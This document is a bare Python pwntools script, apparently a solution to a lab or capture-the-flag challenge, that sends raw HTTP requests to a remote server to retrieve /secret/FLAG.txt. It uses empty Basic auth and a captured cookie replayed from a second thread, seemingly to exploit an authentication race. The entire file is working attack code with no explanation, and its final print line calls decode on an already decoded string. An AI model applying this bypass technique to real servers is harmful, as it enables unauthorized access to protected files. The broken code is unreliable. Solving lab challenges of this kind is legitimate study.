from pwn import *
import time
import threading

r = remote('up.zoolab.org', 10933)

cookie = f""

def send_normal():
    request = "GET / HTTP/1.1\n\n"
    r.sendline(request.encode())

def first_send_flag():
    global cookie, r
    auth = base64.b64encode(b':').decode()
    request = f"GET /secret/FLAG.txt HTTP/1.1\nAuthorization: Basic {auth}\nCookie: {cookie}\n\n"
    r.sendline(request.encode())
    r.recvuntil(b'challenge=')
    cookie = r.recvuntil(b';').decode().replace('\r','')[:-1]
    r.recvuntil(b'\r\n\r\n').decode().replace('\r','')

def send_flag():
    global r
    auth = base64.b64encode(b':').decode()
    print("cookie: ", cookie)
    request = f"GET /secret/FLAG.txt HTTP/1.1\nAuthorization: Basic {auth}\nCookie: {cookie}\n\n"
    r.sendline(request.encode())
    print(r.recvuntil(b'\r\n\r\n').decode().replace('\r','').decode())

thread0 = threading.Thread(target=first_send_flag)
thread1 = threading.Thread(target=send_flag)

thread0.start()
time.sleep(5)
thread1.start()

thread0.join()
thread1.join()


r.close()

